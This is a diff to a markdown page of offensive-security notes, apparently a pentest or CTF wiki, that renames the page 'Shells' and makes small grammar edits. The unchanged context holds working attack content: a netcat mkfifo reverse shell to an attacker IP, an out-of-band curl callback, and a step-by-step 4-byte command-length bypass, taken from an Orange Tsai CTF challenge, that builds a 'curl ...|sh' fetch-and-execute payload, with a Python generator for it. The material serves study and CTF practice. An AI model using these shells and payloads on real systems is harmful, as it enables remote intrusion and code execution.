@@ -1,8 +1,8 @@
 ---
-description: Specific tricks for hacking Linux-based boxes
+description: Specific tricks to get a shell for hacking Linux-based boxes
 ---
 
-# Hacking Linux Boxes
+# Shells
 
 ## Reverse Shells
 
@@ -18,7 +18,7 @@ rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|sh -i 2>&1|nc $YOUR_IP 1337 >/tmp/g
 ```
 {% endcode %}
 
-If filter or weird/short input, try simple downloading then executing in two separate commands
+If you find a filter or have weird/short input, try simply downloading and then executing in two separate commands:
 
 {% code title="Attacker" %}
 ```shell-session
@@ -51,7 +51,7 @@ curl nftca6lpouq.oast.live
 
 Sometimes you're limited in the length of the commands you can execute. There is a technique in bash to execute commands and save things to files, and eventually execute arbitrary code by just sending multiple 4-byte commands. The technique was a solution to a challenge by [Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2).&#x20;
 
-The idea goes like this. Using file redirection with `>` you can save files with a name. Then we can slowly build out some letters to form a different command, and we can combine the letters using `dir`. This command just lists the current directory and places them all after each other separated by spaces. Using the `*` wildcard all files in the current directory will be inserted, but in alphabetical order. This makes it quite hard to do much right now:
+The idea goes like this. Using file redirection with `>` you can save files with a name. Then we can slowly build out some letters to form a different command, and we can combine the letters using `dir`. This command just lists the current directory and places them all after each other separated by spaces. Using the `*` wildcard all files in the current directory will be inserted but in alphabetical order. This makes it quite hard to do much right now:
 
 ```shell-session
 $ >dir  # Define dir command
@@ -68,7 +68,7 @@ $ >rev  # Define rev command
 $ *v>x  # * wildcard matching only rev and v files, saving to x
 ```
 
-Now x contains the desired `ls -th >g` which we can execute whenever we want. Now that the final file will be ordered by time, we can just write out the full payload character by character. Later we will create a file that has all of these seperated by a newline, so we need to add a `\` at the end to escape the newline. Lets make `curl localhost:8000|sh;` for example:
+Now `x` contains the desired `ls -th >g` which we can execute whenever we want. Now that the final file will be ordered by time, we can just write out the full payload character by character. Later we will create a file that has all of these separated by a newline, so we need to add a `\` at the end to escape the newline. Let's make `curl localhost:8000|sh;` for example:
 
 ```shell-session
 $ >\;\\
@@ -86,7 +86,7 @@ $ >rl\\
 $ >cu\\
 ```
 
-In an actual attack you would send only one `\` at the end, but here in the interactive bash we need to escape it ourselves. Executing the `ls -th` command we made earlier now, it gives us the desired command with backslashes to escape the newlines:
+In an actual attack, you would send only one `\` at the end, but here in the interactive bash, we need to escape it ourselves. Executing the `ls -th` command we made earlier now, it gives us the desired command with backslashes to escape the newlines:
 
 ```shell-session
 $ ls -th | cat
@@ -113,7 +113,7 @@ sl
 dir
 ```
 
-Finally, we can execute the `x` script to do the above command into a file called `g`. Then we can run the g script to actually run the payload that fetches a script from the `localhost:8000` address, of course this can be any site of your own to host a malicious payload on.&#x20;
+Finally, we can execute the `x` script to do the above command into a file called `g`. Then we can run the g script to actually run the payload that fetches a script from the `localhost:8000` address, of course, this can be any site of your own to host a malicious payload on.&#x20;
 
 ```shell-session
 $ sh x  # ls -th >g
@@ -180,7 +180,7 @@ for c in payload:
 
 # Optional: Execute proof-of-concept locally
 # for c in payload:
-#     sleep(0.1)  # Wait to make sure time order is correct
+#     sleep(0.1)  # Wait to make sure order is correct (no race conditions)
 #     if len(c) <= 4:  # Max 4 bytes
 #         os.system(c)
 ```
